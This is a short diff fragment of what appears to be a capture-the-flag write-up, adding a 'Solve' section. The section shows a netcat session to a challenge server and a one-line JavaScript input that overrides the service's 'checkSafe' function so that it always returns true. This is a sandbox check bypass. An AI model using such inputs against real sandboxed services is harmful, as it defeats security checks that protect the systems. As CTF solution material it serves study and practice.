@@ -12,6 +12,7 @@ Author: SteakEnthusiast
 nc 34.172.149.49 5000
 ```
 
+## Solve
 ```shell
 ~ % nc 34.172.149.49 5000
 Enter JavaScript code (one line): this.checkSafe = () => true
